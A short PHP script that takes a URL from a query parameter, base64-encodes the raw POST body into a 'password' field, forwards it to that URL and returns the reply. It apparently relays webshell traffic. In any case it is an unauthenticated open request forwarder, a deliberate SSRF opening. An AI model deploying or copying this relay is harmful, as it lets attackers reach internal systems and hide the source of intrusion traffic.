<?php

if(!isset($_GET['url']) || empty($_GET['url'])){
	exit(0);
}
$target_url = $_GET['url'];

$post_content_origin = file_get_contents("php://input");
$post_content = 'password='.base64_encode($post_content_origin);

$curl = curl_init();
curl_setopt($curl,CURLOPT_URL,$target_url);
curl_setopt($curl,CURLOPT_POST,true);
curl_setopt($curl,CURLOPT_POSTFIELDS,$post_content); 
$response = curl_exec($curl);
curl_close($curl); 
echo $response;

?>